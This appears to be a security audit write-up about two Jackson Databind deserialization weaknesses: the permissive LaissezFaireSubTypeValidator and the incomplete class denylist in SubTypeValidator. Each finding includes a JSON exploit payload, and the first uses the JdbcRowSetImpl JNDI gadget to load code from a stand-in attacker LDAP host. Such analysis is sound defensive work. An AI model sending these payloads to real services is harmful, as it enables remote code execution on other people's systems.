Title: Insecure Polymorphic Deserialization via LaissezFaireSubTypeValidator (CWE-502)
Analysis:
When using polymorphic deserialization (default typing) with Jackson Databind, if the application relies on the default validation mechanism or an incomplete allowlist, attackers can exploit Java deserialization vulnerabilities (CWE-502). The `LaissezFaireSubTypeValidator` class inherently provides no validation for polymorphic subtypes and returns `Validity.ALLOWED` for any subclass. This bypasses structural type validation, and if active typing is enabled, it permits arbitrary classes (such as JNDI connections, template execution wrappers) to be loaded and instantiated during the deserialization phase, potentially resulting in Remote Code Execution (RCE) or Server-Side Request Forgery (SSRF).

Conceptual Exploit Payload:
A JSON payload targeting an endpoint deserializing to a polymorphic base type (e.g., `java.lang.Object` or an interface):
```json
[
  "com.sun.rowset.JdbcRowSetImpl",
  {
    "dataSourceName": "ldap://malicious-attacker.com/Exploit",
    "autoCommit": true
  }
]
```
When `LaissezFaireSubTypeValidator` resolves the subtype `com.sun.rowset.JdbcRowSetImpl`, it returns `Validity.ALLOWED` (Line 32, 38). When instantiated, calling `setAutoCommit(true)` invokes the JNDI lookup via `dataSourceName`, executing remote code.

Title: Incomplete Denylist Validation in SubTypeValidator (CWE-184)
Analysis:
The `SubTypeValidator` class provides a blocklist (allow/deny checking via a hardcoded set of forbidden class names `_cfgIllegalClassNames`) to prevent polymorphic deserialization attacks (CWE-502). However, blocklist-based filtering (CWE-184) is fundamentally incomplete and fragile. When custom classes or third-party libraries containing newly discovered gadget types are present on the classpath, they are not caught by this blocklist unless explicitly added. An attacker can systematically identify unlisted gadget classes to execute code or manipulate system states.

Conceptual Exploit Payload:
Using a newly found or unlisted classpath gadget class:
```json
[
  "org.example.vulnerable.NewGadgetClass",
  {
    "targetCommand": "xterm"
  }
]
```
If `org.example.vulnerable.NewGadgetClass` is not present in `_cfgIllegalClassNames` (Line 30-245), the `validateSubType` method (Line 259-304) will fail to flag it, and it will return normally, leading to dangerous initialization.
